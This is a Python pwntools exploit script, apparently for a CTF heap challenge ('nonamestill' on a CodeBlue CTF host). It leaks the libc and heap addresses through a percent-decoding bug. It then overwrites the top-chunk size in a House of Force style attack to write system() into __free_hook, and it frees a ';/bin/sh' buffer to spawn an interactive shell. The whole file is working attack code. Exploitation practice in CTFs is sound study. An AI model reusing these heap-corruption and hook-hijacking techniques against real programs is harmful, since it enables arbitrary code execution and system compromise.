from pwn import *
import sys, time

context.binary = "./nonamestill-12cba55e15194011f39b2dd380797669d84322489db6ee35c0a53f8208a1c9d4"
binary = ELF("./nonamestill-12cba55e15194011f39b2dd380797669d84322489db6ee35c0a53f8208a1c9d4")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

if len(sys.argv) == 1:
    p = process(["./nonamestill-12cba55e15194011f39b2dd380797669d84322489db6ee35c0a53f8208a1c9d4"])
    log.info("PID : " + str(proc.pidof(p)[0]))
    pause()

else:
    p = remote("sms.tasks.ctf.codeblue.jp", "6029")

def create(size, data):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("size: ")
    p.sendline(str(size))
    p.recvuntil("URL: ")
    p.sendline(data)

def decrypt(idx):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("index: ")
    p.sendline(str(idx))

def show():
    p.recvuntil("> ")
    p.sendline("3")

def delete(idx):
    p.recvuntil("> ")
    p.sendline("4")
    p.recvuntil("index: ")
    p.sendline(str(idx))

create(0x18, "A" * 0xe + "%" * 8 + "%")
payload =  "b" * 4 + "%39%25%00%00" + p32(binary.symbols["stdout"] - 4)
create(0x2530, payload)
decrypt(1)
show()
p.recvuntil("1: ")
libc_base = u32(p.recv(4)) - 0x1b2d60
log.info("libc_base : " + hex(libc_base))
delete(0)

create(0x18, "A" * 0xe + "%" * 8 + "%")
payload =  "b" * 4 + "%39%25%00%00" + p32(0x0804B088 - 4)
create(0x2530, payload)
decrypt(1)
show()
p.recvuntil("1: ")
heap_base = u32(p.recv(4)) - 0x1050
log.info("heap_base : " + hex(heap_base))
delete(0)

__free_hook = libc_base + libc.symbols["__free_hook"]
system = libc_base + libc.symbols["system"]
log.info("__free_hook : " + hex(__free_hook))
log.info("system : " + hex(system))
size = 0x20fb8 - 0x255f
create(size, "AAAA")
create(0x18, "A" * 0xe + "%" * 8 + "%")
create(0x100, "\xff" * 0xc)
delete(0)
decrypt(0)

top = heap_base + 0x1fad0
size = (1<<32) - (__free_hook - top - 0x10 - 0x20)
size *= -1
create(size, "")
create(0x28, ";/bin/sh\x00\x00\x00\x00" + p32(system) * 5)
delete(0)
p.interactive()
